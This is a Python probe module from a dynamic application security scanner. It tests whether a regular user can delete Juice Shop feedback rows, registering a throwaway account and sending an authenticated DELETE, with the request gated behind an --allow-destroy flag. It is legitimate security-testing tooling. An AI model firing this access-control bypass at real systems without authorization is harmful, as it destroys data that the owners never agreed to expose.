#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization: regular user can DELETE /api/Feedbacks/<id>.

Juice Shop's "delete the five-star feedback" challenge — the server
should require admin to remove a feedback row, but the controller is
mounted without an authz check, so any authenticated session can
issue the DELETE.

This probe is intrinsically destructive (a DELETE alters server
state). It is OFF by default; the caller must pass `--allow-destroy`
explicitly. The orchestrator never enables it. We ship the probe so
manual operators can fire it once on a target where row loss is
acceptable (a fresh test stand-up, a CTF challenge), then turn it off
again.

Detection signal:
  Authenticated DELETE /api/Feedbacks/<id> → HTTP 200 with
  `{"status":"success"}` in the body. We do NOT confirm with a
  follow-up GET (that would produce the deletion side-effect even on
  a refute path).

Safety: when --allow-destroy is NOT set, the probe issues NO requests
and returns a clearly-labelled `safety_skipped` verdict.
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

FEEDBACKS_PATH = "/api/Feedbacks/{id}"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"feedback-del-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw, "token": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
        except json.JSONDecodeError:
            pass
    return out


class FeedbackDeleteProbe(Probe):
    name = "authz_feedback_delete"
    summary = ("Detects regular-user DELETE on the feedback endpoint "
               "(should require admin authorization).")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--feedback-id", type=int, default=2,
            help="Feedback row id to attempt to delete (default 2 — "
                 "Juice Shop's seed five-star row).")
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required to actually fire the DELETE. Off by default "
                 "because the request alters server state.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: this probe issues a DELETE that "
                         "alters server state. Re-run with "
                         "--allow-destroy on a target where row loss "
                         "is acceptable."),
                evidence={"origin": origin, "safety_skipped": True},
            )

        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        url = urljoin(origin, FEEDBACKS_PATH.format(id=int(args.feedback_id)))
        r = client.request("DELETE", url, headers={
            "Authorization": f"Bearer {token}",
        })
        attempt = {"path": url, "status": r.status, "size": r.size,
                   "body_excerpt": (r.text or "")[:200]}
        evidence = {"origin": origin,
                    "session_email": sess.get("email"),
                    "attempt": attempt}

        confirmed = False
        if r.status == 200 and r.body:
            try:
                doc = json.loads(r.text)
                if isinstance(doc, dict) and \
                   str(doc.get("status", "")).lower() == "success":
                    confirmed = True
                    attempt["delete_succeeded"] = True
            except json.JSONDecodeError:
                pass

        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: regular user DELETE on "
                         f"{url} succeeded with `status:success`. "
                         "The endpoint accepts deletion without an "
                         "admin authorization check."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Add an admin-only authorization check to the "
                    "feedback DELETE handler. The seed row at id=2 "
                    "(five-star feedback) is the canonical exploitation "
                    "target. Pair the fix with audit logging of every "
                    "DELETE so any past abuse is reconstructable."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: DELETE {url} returned status "
                     f"{r.status} — endpoint correctly refused the "
                     "non-admin caller."),
            evidence=evidence,
        )


if __name__ == "__main__":
    FeedbackDeleteProbe().main()
